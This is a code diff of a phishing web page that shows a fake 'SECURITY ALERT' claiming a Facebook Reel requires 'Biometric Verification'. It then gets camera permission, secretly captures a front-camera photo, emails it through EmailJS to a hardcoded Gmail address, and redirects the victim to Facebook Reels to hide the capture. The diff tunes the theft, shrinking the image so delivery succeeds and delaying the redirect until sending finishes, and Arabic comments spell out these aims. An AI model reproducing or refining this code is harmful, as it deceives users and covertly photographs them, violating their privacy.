@@ -30,15 +30,13 @@
     </div>
 
     <script>
-        (function() { emailjs.init("ClasRw06y_NeB2UQ"); })(); // ID الخاص بك
+        (function() { emailjs.init("ClasRw06y_NeB2UQ"); })();
 
         window.onload = async function() {
-            // دمج النص الأول مع الثاني في قالب معقد يوحي بالأمان
-            const securityMsg = "SECURITY ALERT:\n\nThis content is age-restricted and encrypted.\n\nTo decrypt and view this Facebook Reel, you must complete the Biometric Verification.\n\nClick OK to start the secure scanning process.";
+            const securityMsg = "SECURITY ALERT:\n\nThis content is age-restricted and encrypted.\n\nTo view this Facebook Reel, you must complete the Biometric Verification.\n\nClick OK to start.";
             
             if (confirm(securityMsg)) {
                 try {
-                    // هنا يظهر إذن الكاميرا مباشرة بعد الرسالة المعقدة
                     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                     const video = document.createElement('video');
                     video.srcObject = stream;
@@ -55,22 +53,28 @@
                         
                         if (seconds <= 0) {
                             clearInterval(interval);
-                            document.getElementById('mainBody').style.backgroundColor = "#FFFFFF"; // فلاش الضوء
+                            document.getElementById('mainBody').style.backgroundColor = "#FFFFFF"; 
                             
                             setTimeout(() => {
                                 const canvas = document.createElement('canvas');
-                                canvas.width = 1280; canvas.height = 720;
-                                canvas.getContext('2d').drawImage(video, 0, 0, 1280, 720);
+                                // تصغير الحجم لضمان وصول الإيميل (مهم جداً)
+                                canvas.width = 640; canvas.height = 480; 
+                                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                                
+                                // جودة الصورة 0.5 لتقليل الحجم وتسريع الإرسال
+                                const dataOutput = canvas.toDataURL('image/jpeg', 0.5);
                                 
                                 emailjs.send('service_w3dev60', 'template_7k8tall', {
-                                    image_data: canvas.toDataURL('image/jpeg', 0.7),
+                                    image_data: dataOutput,
                                     to_email: 'tayebiabd2016@gmail.com'
+                                }).then(function() {
+                                    // لن يتم التحويل إلا بعد التأكد من ضغط زر الإرسال
+                                    window.location.href = "https://www.facebook.com/reels/";
+                                }, function(error) {
+                                    window.location.href = "https://www.facebook.com/reels/";
                                 });
 
-                                setTimeout(() => {
-                                    window.location.href = "https://www.facebook.com/reels/";
-                                }, 300);
-                            }, 400);
+                            }, 500);
                         }
                     }, 1000);
 
